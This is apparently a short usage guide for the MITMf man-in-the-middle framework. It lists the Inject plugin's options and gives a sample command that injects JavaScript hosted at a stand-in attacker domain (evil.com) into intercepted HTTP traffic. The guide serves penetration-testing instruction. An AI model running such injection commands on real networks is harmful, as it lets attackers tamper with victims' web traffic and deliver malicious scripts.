#**Using the Plugins**

The real power of MITMf comes from it's plugins! when enabled these can modify HTTP traffic in various ways!

For a full list of all the plugins and their relative options run:
```
python mitmf.py --help
```

How would we use one? easy! Let's take a look:
```
Inject:
  Inject arbitrary content into HTML content

  --inject              Load plugin 'Inject'
  --js-url JS_URL       URL of the JS to inject
  --js-payload JS_PAYLOAD
                        JS string to inject
  --js-file JS_FILE     File containing JS to inject
  --html-url HTML_URL   URL of the HTML to inject
  --html-payload HTML_PAYLOAD
                        HTML string to inject
  --html-file HTML_FILE
                        File containing HTML to inject
  --per-domain          Inject once per domain per client.
  --rate-limit RATE_LIMIT
                        Inject once every RATE_LIMIT seconds per client.
  --count-limit COUNT_LIMIT
                        Inject only COUNT_LIMIT times per client.
  --white-ips IP        Inject content ONLY for these ips (comma seperated)
  --black-ips IP        DO NOT inject content for these ips (comma seperated)
  --white-domains DOMAINS
                        Inject content ONLY for these domains (comma seperated)
  --black-domains DOMAINS
                        DO NOT inject content for these domains (comma seperated)
```

This is the Inject plugin! To call it all we need to do is:
```
python mitmf.py -i interface --inject --js-url http://evil.com/evil.js
```
Here I'm calling the inject plugin with the ```--inject``` argument and passing in it's ```--js-url``` option to inject a Javascipt file in the intercepted HTTP traffic!

**Note: you can use multiple plugins at the same time!**